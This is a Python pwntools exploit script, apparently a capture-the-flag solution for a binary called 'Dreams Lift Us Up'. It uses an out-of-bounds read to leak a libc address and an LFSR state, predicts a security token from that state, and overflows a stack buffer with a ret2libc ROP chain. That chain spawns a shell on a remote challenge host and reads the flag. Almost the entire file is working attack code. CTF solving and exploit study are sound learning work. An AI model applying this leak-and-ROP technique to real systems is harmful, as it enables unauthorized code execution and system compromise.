#!/usr/bin/env python3
# Dreams Lift Us Up - SunCTF 2026
#
# Two bugs:
#  1. G glimpse[u16 k] writes k (<=0x100) bytes from 0x404080, but the banner
#     there is only 22 bytes. The OOB read spills the adjacent globals:
#       0x404098 = stdout (libc _IO_2_1_stdout_)  -> defeats ASLR
#       0x4040a0 = the 64-bit Galois LFSR state   -> defeats the "unpredictable"
#                                                    privileged-frame token
#  2. L lift[u16 n] reads up to 0x200 bytes into a 64-byte stack buffer at
#     rsp+0x10 (no canary, no PIE) -> straight stack smash.
#     rsp+0x50 (input+64) holds the token memcmp'd against the freshly
#     generated one; rsp+0x58 (input+72) is the saved return address.
#
# So: leak state -> compute the exact token the lift will demand -> satisfy the
# memcmp so we return instead of _exit(1) -> ret2libc off the same overflow.
import sys
from pwn import *

context.binary = ELF("./dreams", checksec=False)
context.log_level = "info"
libc = ELF("./libc.so.6", checksec=False)

POLY = 0xAD93D23594C935A9
TOKEN_OFF, RET_OFF = 64, 72


def lift_token(state):
    """Reproduce sub_4012a2's 64-step Galois LFSR: token bit i = state&1 before step i."""
    tok = 0
    for i in range(64):
        b = state & 1
        state = (state >> 1) ^ (POLY if b else 0)
        tok |= b << i
    return tok


def exploit(io):
    io.recvuntil(b"Q\n")

    io.send(b"G" + p16(0x100))
    io.recvuntil(b"[glimpse] ")
    leak = io.recv(0x100)

    stdout_ptr = u64(leak[0x18:0x20])
    state = u64(leak[0x20:0x28])
    libc.address = stdout_ptr - libc.sym["_IO_2_1_stdout_"]
    log.success(f"stdout       = {stdout_ptr:#x}")
    log.success(f"libc base    = {libc.address:#x}")
    log.success(f"LFSR state   = {state:#x}")
    assert libc.address & 0xFFF == 0, "libc base not page-aligned - bad leak"

    token = lift_token(state)
    log.success(f"lift token   = {token:#x}")

    # gadgets straight out of the ELF: pwntools' ROP() gadget cache is unusable
    # on this host's Python (safeeval chokes on 3.14 bytecode in the cache file)
    pop_rdi = next(libc.search(asm("pop rdi; ret"), executable=True))
    ret = next(libc.search(asm("ret"), executable=True))

    payload = flat({
        0:          b"A" * TOKEN_OFF,
        TOKEN_OFF:  p64(token),
        RET_OFF:    [
            ret,                                    # movaps alignment
            pop_rdi,
            next(libc.search(b"/bin/sh\x00")),
            libc.sym["system"],
        ],
    })
    assert len(payload) <= 0x200

    io.send(b"L" + p16(len(payload)) + payload)
    io.recvuntil(b"[lifted]\n")
    log.success("token accepted - returning into ROP chain")
    return io


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        io = remote("dreams.chal.sunwaycybersecurityclub.org", 9404)
    else:
        io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./dreams"])
    exploit(io)
    io.sendline(b"id; cat flag* /flag* 2>/dev/null")
    io.interactive()
